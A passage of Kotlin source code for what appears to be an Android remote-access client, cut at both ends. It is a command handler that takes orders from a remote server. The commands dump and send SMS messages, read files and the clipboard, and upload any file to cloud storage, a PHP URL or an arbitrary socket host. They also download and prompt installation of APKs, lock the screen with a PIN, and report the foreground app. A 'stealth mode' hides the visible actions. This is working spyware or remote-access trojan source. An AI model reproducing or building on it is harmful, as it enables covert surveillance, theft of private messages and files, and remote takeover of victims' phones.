            connManager!!.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
        if (mWifi != null) {
            if (mWifi.isConnected) {
                ssid = info.ssid
            }
        }
        sendMessage(
            context,
            false,
            "GET_WIFI_STATUS: Is Turned On: $state - SSID: $ssid - Mac Address: $macAddr - RSSI: ${info.rssi}",
            messageID, serverID
        )
    } else if (command == "TURN_ON_BLUETOOTH") {
        if (bluetoothAdapter!!.enable()) {
            sendMessage(
                context,
                false,
                "TURN_ON_BLUETOOTH: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "TURN_ON_BLUETOOTH: Operation failed",
                messageID, serverID
            )
        }
    } else if (command == "TURN_OFF_BLUETOOTH") {
        if (bluetoothAdapter!!.disable()) {
            sendMessage(
                context,
                false,
                "TURN_OFF_BLUETOOTH: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "TURN_OFF_BLUETOOTH: Operation failed",
                messageID, serverID
            )
        }
    } else if (command == "TURN_ON_WIFI") {
        val wifiManager =
            context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        if (wifiManager.setWifiEnabled(true)) {
            sendMessage(
                context,
                false,
                "TURN_ON_WIFI: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "TURN_ON_WIFI: Operation failed",
                messageID, serverID
            )
        }
    } else if (command == "TURN_OFF_WIFI") {
        val wifiManager =
            context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        if (wifiManager.setWifiEnabled(false)) {
            sendMessage(
                context,
                false,
                "TURN_OFF_WIFI: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "TURN_OFF_WIFI: Operation failed",
                messageID, serverID
            )
        }
    } else if (command == "START_BLE_ADVERTISING") {
        if (bluetoothAdapter!!.isEnabled) {
            val settings = AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(false)
                .build()

            val data = AdvertiseData.Builder()
                .setIncludeDeviceName(true)
                .setIncludeTxPowerLevel(true)
                .build()

            if (advertiseCallback != null) {
                bluetoothLeAdvertiser?.stopAdvertising(advertiseCallback)
            }
            advertiseCallback = object : AdvertiseCallback() {
                override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                    super.onStartSuccess(settingsInEffect)
                    sendMessage(
                        c,
                        false,
                        "START_BLE_ADVERTISING: Operation completed successfully",
                        messageID, serverID
                    )
                }

                override fun onStartFailure(errorCode: Int) {
                    super.onStartFailure(errorCode)
                    sendMessage(
                        c,
                        false,
                        "START_BLE_ADVERTISING: Operation failed - error code: $errorCode",
                        messageID, serverID
                    )
                }
            }
            bluetoothLeAdvertiser?.startAdvertising(
                settings,
                data,
                advertiseCallback
            )
        } else {
            sendMessage(
                c,
                false,
                "START_BLE_ADVERTISING: Operation failed - bluetooth not enabled",
                messageID, serverID
            )
        }
    } else if (command == "STOP_BLE_ADVERTISING") {
        if (advertiseCallback != null) {
            bluetoothLeAdvertiser?.stopAdvertising(advertiseCallback)
        }
        sendMessage(
            context,
            false,
            "STOP_BLE_ADVERTISING: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_BLUETOOTH_ADAPTER_NAME") {
        sendMessage(context, false, "GET_BLUETOOTH_ADAPTER_NAME: ${bluetoothAdapter?.name}", messageID, serverID)
    } else if (command.startsWith("SET_BLUETOOTH_ADAPTER_NAME ")) {
        bluetoothAdapter?.name = command.removePrefix("SET_BLUETOOTH_ADAPTER_NAME ")
        sendMessage(context, false, "SET_BLUETOOTH_ADAPTER_NAME: Operation completed successfully", messageID, serverID)
    } else if (command.startsWith("LIST_DIR ")) {
        var hasPermission = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                hasPermission = true
            }
        } else {
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                hasPermission = true
            }
        }
        if (hasPermission) {
            val path = "/" + command.removePrefix("LIST_DIR ").removePrefix("/")
            val directory = File(path)
            if (directory.exists()) {
                if (directory.isDirectory) {
                    val files = directory.listFiles()
                    if (files != null) {
                        var fileListStr = "LIST_DIR: "
                        for (file in files) {
                            fileListStr += file.name
                            if (file.isDirectory)
                                fileListStr += "<:>"
                            fileListStr += "/"
                        }
                        sendMessage(
                            context,
                            false,
                            fileListStr.removeSuffix("/"),
                            messageID, serverID
                        )
                    } else {
                        sendMessage(
                            context,
                            false,
                            "LIST_DIR: Operation failed",
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "LIST_DIR: Operation failed - is not a directory",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "LIST_DIR: Operation failed - directory does not exist",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "LIST_DIR: Operation failed - permission not granted",
                messageID, serverID
            )
        }
    } else if (command == "GET_CURRENTLY_OPENED_APP") {
        sendMessage(
            context,
            false,
            "GET_CURRENTLY_OPENED_APP: $prevPackageName",
            messageID, serverID
        )
    } else if (command.startsWith("UPLOAD_FILE ")) {
        var hasPermission = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                hasPermission = true
            }
        } else {
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                hasPermission = true
            }
        }
        if (hasPermission) {
            val filePath = "/" + command.removePrefix("UPLOAD_FILE ").removePrefix("/")
            val file = File(filePath)
            if (file.exists()) {
                if (file.isFile) {
                    storage.child(file.name)
                        .putFile(Uri.fromFile(file))
                        .addOnCompleteListener {
                            if (it.isSuccessful) {
                                sendMessage(
                                    context,
                                    false,
                                    "UPLOAD_FILE: Operation completed successfully",
                                    messageID, serverID
                                )
                            } else {
                                sendMessage(
                                    context,
                                    false,
                                    "UPLOAD_FILE: Operation failed - ${it.exception?.localizedMessage}",
                                    messageID, serverID
                                )
                            }
                        }
                } else {
                    sendMessage(
                        context,
                        false,
                        "UPLOAD_FILE: Operation failed - ${file.absolutePath} is not a file",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "UPLOAD_FILE: Operation failed - file does not exist",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "UPLOAD_FILE: Operation failed - permission not granted",
                messageID, serverID
            )
        }
    } else if (command.startsWith("DOWNLOAD_FILE ")) {
        val name = command.removePrefix("DOWNLOAD_FILE ")
        Log.d("ClientService", "Downloading file: $name")
        val file = File(File(Environment.getExternalStorageDirectory(), "Client"), name)
        file.parentFile?.mkdir()
        if (!file.exists()) {
            storage.child(name).getFile(
                Uri.fromFile(
                    file
                )
            ).addOnCompleteListener {
                if (it.isSuccessful) {
                    sendMessage(
                        context,
                        false,
                        "DOWNLOAD_FILE: Operation completed successfully",
                        messageID, serverID
                    )
                } else {
                    sendMessage(
                        context,
                        false,
                        "DOWNLOAD_FILE: Operation failed - ${it.exception?.localizedMessage}",
                        messageID, serverID
                    )
                }
            }
        } else {
            sendMessage(
                context,
                false,
                "DOWNLOAD_FILE: Operation failed - file already exists at ${file.absolutePath}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("COPY ")) {
        var hasPermission = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                hasPermission = true
            }
        } else {
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                hasPermission = true
            }
        }
        if (hasPermission) {
            try {
                val srcPath = "/" + command.removePrefix("COPY ")
                    .split(" <?`> ")[0].removePrefix("/")
                val destPath = "/" + command.removePrefix("COPY ")
                    .split(" <?`> ")[1].removePrefix("/")
                val srcFile = File(srcPath)
                val destFile = File(destPath)
                if (srcFile.exists()) {
                    if (!destFile.exists()) {
                        srcFile.copyRecursively(destFile)
                        sendMessage(
                            context,
                            false,
                            "COPY: Operation completed successfully",
                            messageID, serverID
                        )
                    } else {
                        sendMessage(
                            context,
                            false,
                            "COPY: Operation failed - destination file $destPath exists",
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "COPY: Operation failed - source file $srcPath does not exist",
                        messageID, serverID
                    )
                }
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "COPY: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "COPY: Operation failed - permission not granted",
                messageID, serverID
            )
        }
    } else if (command.startsWith("DELETE ")) {
        var hasPermission = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                hasPermission = true
            }
        } else {
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                hasPermission = true
            }
        }
        if (hasPermission) {
            try {
                val path = "/" + command.removePrefix("DELETE ")
                    .removePrefix("/")
                val file = File(path)
                if (file.exists()) {
                    if (deleteRecursive(file)) {
                        sendMessage(
                            context,
                            false,
                            "DELETE: Operation completed successfully",
                            messageID, serverID
                        )
                    } else {
                        sendMessage(
                            context,
                            false,
                            "DELETE: Operation failed - unknown error",
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "DELETE: Operation failed - file/directory does not exist",
                        messageID, serverID
                    )
                }
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "DELETE: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        }
    } else if (command == "LOCK_DEVICE_SCREEN") {
        if (!isStealthModeEnabled) {
            if (!isLockedWithPin) {
                isLocked = true
                killAll = false
                with(preferences.edit()) {
                    putBoolean("IsLocked", true)
                    putBoolean("killAll", false)
                    commit()
                }
                val i = Intent(context, LockedActivity::class.java)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(i)
                sendMessage(
                    context,
                    false,
                    "LOCK_DEVICE_SCREEN: Operation completed successfully",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "LOCK_DEVICE_SCREEN: Operation failed - device already locked with pin",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(context, false, "LOCK_DEVICE_SCREEN: Stealth mode is enabled", messageID, serverID)
        }
    } else if (command == "UNLOCK_DEVICE_SCREEN") {
        isLocked = false
        killAll = true
        isLockedWithPin = false
        with(preferences.edit()) {
            putBoolean("IsLocked", false)
            putBoolean("IsLockedWithPin", false)
            putBoolean("killAll", true)
            commit()
        }
        sendMessage(
            context,
            false,
            "UNLOCK_DEVICE_SCREEN: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "IS_DEVICE_SCREEN_LOCKED") {
        sendMessage(
            context,
            false,
            "IS_DEVICE_SCREEN_LOCKED: ${boolToYesNo(isLocked || isLockedWithPin)}",
            messageID, serverID
        )
    } else if (command.startsWith("LOCK_DEVICE_SCREEN_WITH_PIN ")) {
        if (!isStealthModeEnabled) {
            if (!isLocked && !isLockedWithPin) {
                isLockedWithPin = true
                killAll = false
                with(preferences.edit()) {
                    putBoolean("IsLockedWithPin", true)
                    putString("Pin", command.removePrefix("LOCK_DEVICE_SCREEN_WITH_PIN "))
                    putBoolean("killAll", false)
                    commit()
                }
                val i = Intent(context, LockedWithPinActivity::class.java)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(i)
                sendMessage(
                    context,
                    false,
                    "LOCK_DEVICE_SCREEN_WITH_PIN: Operation completed successfully",
                    messageID, serverID
                )
            } else {
                if (isLockedWithPin) {
                    val i = Intent(context, LockedActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    i.putExtra("Pin", preferences.getString("Pin", ""))
                    context.startActivity(i)
                }
                sendMessage(
                    context,
                    false,
                    "LOCK_DEVICE_SCREEN_WITH_PIN: Operation failed - device already locked",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(context, false, "LOCK_DEVICE_SCREEN_WITH_PIN: Stealth mode is enabled", messageID, serverID)
        }
    } else if (command.startsWith("PROMPT_TO_INSTALL_APP ")) {
        val path = command.removePrefix("PROMPT_TO_INSTALL_APP ")
        val file = File(path)
        if (file.exists()) {
            val intent = Intent(Intent.ACTION_INSTALL_PACKAGE)
            intent.setDataAndType(
                FileProvider.getUriForFile(
                    context,
                    BuildConfig.APPLICATION_ID + ".provider",
                    file
                ), "application/vnd.android.package-archive"
            )
            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
            context.startActivity(intent)
        }
        sendMessage(
            context,
            false,
            "PROMPT_TO_INSTALL_APP: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_EXTERNAL_STORAGE_LOCATION") {
        sendMessage(
            context,
            false,
            "GET_EXTERNAL_STORAGE_LOCATION: ${Environment.getExternalStorageDirectory().absolutePath}",
            messageID, serverID
        )
    } else if (command.startsWith("DUMP_LAST_N_SMS_TO_FILE ")) {
        try {
            val n = command.removePrefix("DUMP_LAST_N_SMS_TO_FILE ")
                .split(" ")[0].toInt()
            val filePath = removeBeforeFirstSeparator(command.removePrefix("DUMP_LAST_N_SMS_TO_FILE "), " ")
            writeSmsToFile(getLastNSms(context, n), File(filePath))
            sendMessage(
                context,
                false,
                "DUMP_LAST_N_SMS_TO_FILE: Operation completed successfully",
                messageID, serverID
            )
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "DUMP_LAST_N_SMS_TO_FILE: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("DUMP_ALL_SMS_TO_FILE ")) {
        try {
            val filePath =
                command.removePrefix("DUMP_ALL_SMS_TO_FILE ")
            writeSmsToFile(getAllSms(context), File(filePath))
            sendMessage(
                context,
                false,
                "DUMP_ALL_SMS_TO_FILE: Operation completed successfully",
                messageID, serverID
            )
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "DUMP_ALL_SMS_TO_FILE: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_LAST_N_SMS ")) {
        try {
            val n = command.removePrefix("GET_LAST_N_SMS ").toInt()
            val smses = getLastNSms(context, n)
            var str = ""
            for (sms in smses) {
                str += "$sms\n"
            }
            sendMessage(
                context,
                false,
                "GET_LAST_N_SMS: $str",
                messageID, serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "GET_LAST_N_SMS: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_FILE_SIZE ")) {
        try {
            val path = command.removePrefix("GET_FILE_SIZE ")
            val file = File(path)
            if (file.exists()) {
                sendMessage(
                    context,
                    false,
                    "GET_FILE_SIZE: ${getFolderSize(file)}",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "GET_FILE_SIZE: Operation failed - file does not exist",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "GET_FILE_SIZE: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("MAKE_DIR ")) {
        try {
            val dir = File("/" + command.removePrefix("MAKE_DIR ").removePrefix("/"))
            if (!dir.exists()) {
                if (dir.mkdir()) {
                    sendMessage(
                        context,
                        false,
                        "MAKE_DIR: Operation completed successfully",
                        messageID, serverID
                    )
                } else {
                    sendMessage(
                        context,
                        false,
                        "MAKE_DIR: Operation failed",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "MAKE_DIR: Operation failed - ${dir.path} already exists",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "MAKE_DIR: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("MAKE_DIRS ")) {
        try {
            val dir = File("/" + command.removePrefix("MAKE_DIRS ").removePrefix("/"))
            if (!dir.exists()) {
                if (dir.mkdirs()) {
                    sendMessage(
                        context,
                        false,
                        "MAKE_DIRS: Operation completed successfully",
                        messageID, serverID
                    )
                } else {
                    sendMessage(
                        context,
                        false,
                        "MAKE_DIRS: Operation failed",
                        messageID, serverID
                    )
                }
            } else {
                sendMessage(
                    context,
                    false,
                    "MAKE_DIRS: Operation failed - ${dir.path} already exists",
                    messageID, serverID
                )
            }
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "MAKE_DIRS: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "MUTE_VOLUME") {
        audioManager?.adjustVolume(AudioManager.ADJUST_MUTE, 0)
        sendMessage(
            context,
            false,
            "MUTE_VOLUME: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "UNMUTE_VOLUME") {
        audioManager?.adjustVolume(AudioManager.ADJUST_UNMUTE, 0)
        sendMessage(
            context,
            false,
            "UNMUTE_VOLUME: Operation completed successfully",
            messageID, serverID
        )
    } else if (command.startsWith("PLAY_SONG ")) {
        if (!isStealthModeEnabled) {
            try {
                if (isPlayingSong)
                    songPlayer!!.stop()
                val path = "/" + command.removePrefix("PLAY_SONG ").removePrefix("/")
                val file = File(path)
                val uri = Uri.fromFile(file)
                songPlayer = MediaPlayer()
                songPlayer!!.setDataSource(context, uri)
                songPlayer!!.prepare()
                songPlayer!!.start()
                isPlayingSong = true
                sendMessage(
                    context,
                    false,
                    "PLAY_SONG: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "PLAY_SONG: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(context, false, "PLAY_SONG: Stealth mode is enabled", messageID, serverID)
        }
    } else if (command.startsWith("PLAY_SONG_FROM_URL ")) {
        if (!isStealthModeEnabled) {
            try {
                if (isPlayingSong)
                    songPlayer!!.stop()
                val url = command.removePrefix("PLAY_SONG_FROM_URL ")
                songPlayer = MediaPlayer()
                songPlayer!!.setDataSource(url)
                songPlayer!!.prepare()
                songPlayer!!.start()
                isPlayingSong = true
                sendMessage(
                    context,
                    false,
                    "PLAY_SONG_FROM_URL: Operation completed successfully",
                    messageID, serverID
                )
            } catch (ex: Exception) {
                sendMessage(
                    context,
                    false,
                    "PLAY_SONG_FROM_URL: Operation failed - ${ex.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(context, false, "PLAY_SONG_FROM_URL: Stealth mode is enabled", messageID, serverID)
        }
    } else if (command == "STOP_SONG") {
        try {
            if (isPlayingSong) {
                songPlayer!!.stop()
                isPlayingSong = false
            }
            sendMessage(
                context,
                false,
                "STOP_SONG: Operation completed successfully",
                messageID, serverID
            )
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "STOP_SONG: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "PAUSE_SONG") {
        if (songPlayer != null) {
            isPlayingSong = false
            songPlayer!!.pause()
        }
        sendMessage(
            context,
            false,
            "PAUSE_SONG: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "RESUME_SONG") {
        if (songPlayer != null) {
            isPlayingSong = true
            songPlayer!!.start()
        }
        sendMessage(
            context,
            false,
            "RESUME_SONG: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "LOOP_SONG") {
        if (songPlayer != null)
            songPlayer!!.isLooping = true
        sendMessage(
            context,
            false,
            "LOOP_SONG: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "UNLOOP_SONG") {
        if (songPlayer != null)
            songPlayer!!.isLooping = false
        sendMessage(
            context,
            false,
            "UNLOOP_SONG: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_DEVICE_ID") {
        sendMessage(context, false, "GET_DEVICE_ID: $currentDeviceID", messageID, serverID)
    } else if (command == "TURN_ON_FLASHLIGHT") {
        if (!isStealthModeEnabled) {
            val flashHelper = FlashlightHelper(context)
            if (flashHelper.isFlashAvailable()) {
                flashHelper.turnOnFlashlight()
                sendMessage(
                    context,
                    false,
                    "TURN_ON_FLASHLIGHT: Operation completed successfully",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "TURN_ON_FLASHLIGHT: Operation failed - flash not supported",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(context, false, "TURN_ON_FLASHLIGHT: Stealth mode is enabled", messageID, serverID)
        }
    } else if (command == "TURN_OFF_FLASHLIGHT") {
        if (!isStealthModeEnabled) {
            val flashHelper = FlashlightHelper(context)
            if (flashHelper.isFlashAvailable()) {
                flashHelper.turnOffFlashlight()
                sendMessage(
                    context,
                    false,
                    "TURN_OFF_FLASHLIGHT: Operation completed successfully",
                    messageID, serverID
                )
            } else {
                sendMessage(
                    context,
                    false,
                    "TURN_OFF_FLASHLIGHT: Operation failed - flash not supported",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(context, false, "TURN_OFF_FLASHLIGHT: Stealth mode is enabled", messageID, serverID)
        }
    } else if (command == "GET_BATTERY_STATUS") {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val capacity =
            bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val batteryStatus: Intent? =
            IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
                applicationContext.registerReceiver(null, ifilter)
            }
        val status: Int = batteryStatus?.getIntExtra(
            BatteryManager.EXTRA_STATUS,
            -1
        ) ?: -1
        sendMessage(
            context,
            false,
            "GET_BATTERY_STATUS: Battery Level: $capacity%, Is Charging: ${boolToYesNo(status == BatteryManager.BATTERY_STATUS_CHARGING)}",
            messageID, serverID
        )
    } else if (command.startsWith("COPY_TO_CLIPBOARD ")) {
        val clipboard =
            context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val label = command.removePrefix("COPY_TO_CLIPBOARD ").split(" <^ ^> ")[0]
        val clip = ClipData.newPlainText(
            label,
            command.removePrefix("COPY_TO_CLIPBOARD $label <^ ^> ")
        )
        clipboard.setPrimaryClip(clip)
        sendMessage(
            context,
            false,
            "COPY_TO_CLIPBOARD: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_CLIPBOARD_CONTENT") {
        val clipboard =
            context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.getItemAt(
                0
            )?.text != null
        ) {
            // Get the text from the clipboard
            val text =
                clipboard.primaryClip?.getItemAt(0)?.text.toString()
            sendMessage(context, false, "GET_CLIPBOARD_CONTENT: $text", messageID, serverID)
        } else {
            sendMessage(
                context,
                false,
                "GET_CLIPBOARD_CONTENT: No text found in clipboard",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_FILE_CONTENT ")) {
        val path = "/" + command.removePrefix("GET_FILE_CONTENT ").removePrefix("/")
        val file = File(path)
        if (file.exists()) {
            sendMessage(
                context,
                false,
                "GET_FILE_CONTENT: ${file.readText()}",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "GET_FILE_CONTENT: Operation failed - file does not exist",
                messageID, serverID
            )
        }
    } else if (command.startsWith("DOWNLOAD_FILE_FROM_URL ")) {
        try {
            val fileUrl =
                command.removePrefix("DOWNLOAD_FILE_FROM_URL ")
                    .split(" <^ ^> ")[0]
            val filePath = command.removePrefix("DOWNLOAD_FILE_FROM_URL ").split(" <^ ^> ")[1].removePrefix("/")
            if (File(filePath).exists()) {
                sendMessage(
                    context,
                    false,
                    "DOWNLOAD_FILE_FROM_URL: Operation failed - file already exists",
                    messageID, serverID
                )
            } else {
                downloadFileThreaded(
                    context,
                    fileUrl,
                    filePath,
                    object : DownloadUploadCallback {
                        override fun onSuccess(filePath: String) {
                            sendMessage(
                                c,
                                false,
                                "DOWNLOAD_FILE_FROM_URL: Operation completed successfully",
                                messageID, serverID
                            )
                        }

                        override fun onFailure(error: Throwable) {
                            error.printStackTrace()
                            sendMessage(
                                c,
                                false,
                                "DOWNLOAD_FILE_FROM_URL: Operation failed - ${error.localizedMessage}",
                                messageID, serverID
                            )
                        }
                    })
            }
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "DOWNLOAD_FILE_FROM_URL: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("UPLOAD_FILE_TO_PHP_URL ")) {
        try {
            var filePath = "/" + command.removePrefix("UPLOAD_FILE_TO_PHP_URL ").split(" <^ ^> ")[0].removePrefix("/")
            while (filePath.endsWith(" "))
                filePath = filePath.removeSuffix(" ")
            val serverUrl =
                command.removePrefix("UPLOAD_FILE_TO_PHP_URL ")
                    .split(" <^ ^> ")[1]

            if (!File(filePath).exists()) {
                Log.d("ClientService", "File Path: $filePath")
                sendMessage(
                    context,
                    false,
                    "UPLOAD_FILE_TO_PHP_URL: Operation failed - file does not exist",
                    messageID, serverID
                )
            } else {
                uploadFileThreaded(
                    context,
                    filePath,
                    serverUrl,
                    object : DownloadUploadCallback {
                        override fun onSuccess(serverResponse: String) {
                            sendMessage(
                                c,
                                false,
                                "UPLOAD_FILE_TO_PHP_URL: Operation completed successfully - server response: $serverResponse",
                                messageID, serverID
                            )
                        }

                        override fun onFailure(error: Throwable) {
                            error.printStackTrace()
                            sendMessage(
                                c,
                                false,
                                "UPLOAD_FILE_TO_PHP_URL: Operation failed - ${error.localizedMessage}",
                                messageID, serverID
                            )
                        }
                    })
            }
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "UPLOAD_FILE_TO_PHP_URL: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("UPLOAD_FILE_TO_SERVER_USING_SOCKET ")) {
        var serverPort = 0
        var serverAddress = ""
        var filePath = ""
        var continueForward = true
        try {
            serverPort =
                command.removePrefix("UPLOAD_FILE_TO_SERVER_USING_SOCKET ")
                    .split(" <^ ^> ")[1].toInt()
            serverAddress =
                command.removePrefix("UPLOAD_FILE_TO_SERVER_USING_SOCKET ")
                    .split(" <^ ^> ")[0]
            filePath =
                "/" + command.removePrefix("UPLOAD_FILE_TO_SERVER_USING_SOCKET ")
                    .split(" <^ ^> ")[2].removePrefix("/")
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(
                context,
                false,
                "UPLOAD_FILE_TO_SERVER_USING_SOCKET: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
            continueForward = false
        }
        if (continueForward) {
            if (File(filePath).exists()) {
                Thread {
                    var socket: Socket? = null
                    var outputStream: OutputStream? = null
                    val file: File
                    var inputStream: FileInputStream? = null
                    try {
                        socket = Socket(serverAddress, serverPort)
                        outputStream = socket.getOutputStream()
                        file = File(filePath)
                        inputStream = FileInputStream(file)
                        val fileNameBytes =
                            file.name.toByteArray(Charsets.UTF_8)
                        outputStream.write(
                            fileNameBytes,
                            0,
                            fileNameBytes.size
                        )
                        val buffer = ByteArray(1024)
                        var bytesRead: Int
                        while (true) {
                            bytesRead = inputStream.read(buffer)
                            if (bytesRead == -1)
                                break
                            else
                                outputStream.write(
                                    buffer,
                                    0,
                                    bytesRead
                                )
                        }
                        outputStream.flush()
                        sendMessage(
                            context,
                            false,
                            "UPLOAD_FILE_TO_SERVER_USING_SOCKET: Operation completed successfully",
                            messageID, serverID
                        )
                    } catch (ex: Exception) {
                        // Handle exceptions (e.g., network errors, file not found)
                        ex.printStackTrace()
                        sendMessage(
                            context,
                            false,
                            "UPLOAD_FILE_TO_SERVER_USING_SOCKET: Operation failed - ${ex.localizedMessage}",
                            messageID, serverID
                        )
                    } finally {
                        try {
                            inputStream?.close()
                            outputStream?.close()
                            socket?.close()
                        } catch (ex: IOException) {
                            // Handle exceptions during closing
                            ex.printStackTrace()
                            sendMessage(
                                context,
                                false,
                                "UPLOAD_FILE_TO_SERVER_USING_SOCKET: Operation failed - ${ex.localizedMessage}",
                                messageID, serverID
                            )
                        }
                    }
                }.start()
            } else {
                sendMessage(
                    context,
                    false,
                    "UPLOAD_FILE_TO_SERVER_USING_SOCKET: Operation failed - file does not exist",
                    messageID, serverID
                )
            }
        }
    } else if (command.startsWith("IS_DIRECTORY ")) {
        val path = "/" + command.removePrefix("IS_DIRECTORY ").removePrefix("/")
        val file = File(path)
        if (file.exists()) {
            sendMessage(
                context,
                false,
                "IS_DIRECTORY: ${boolToYesNo(file.isDirectory)}",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "IS_DIRECTORY: Operation failed - ${command.removePrefix("IS_DIRECTORY ")} does not exist",
                messageID, serverID
            )
        }
    } else if (command.startsWith("IS_FILE ")) {
        val path = "/" + command.removePrefix("IS_FILE ").removePrefix("/")
        val file = File(path)
        if (file.exists()) {
            sendMessage(
                context,
                false,
                "IS_FILE: ${boolToYesNo(file.isFile)}",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "IS_FILE: Operation failed - ${file.absolutePath} does not exist",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_FILE_METADATA ")) {
        val path = "/" + command.removePrefix("GET_FILE_METADATA ").removePrefix("/")
        val file = File(path)
        if (file.exists()) {
            val mimeType = getMimeType(context, Uri.fromFile(file))
            if (isImageFile(context, Uri.fromFile(file))) {
                val coordinates =
                    getGpsCoordinates(context, Uri.fromFile(file))
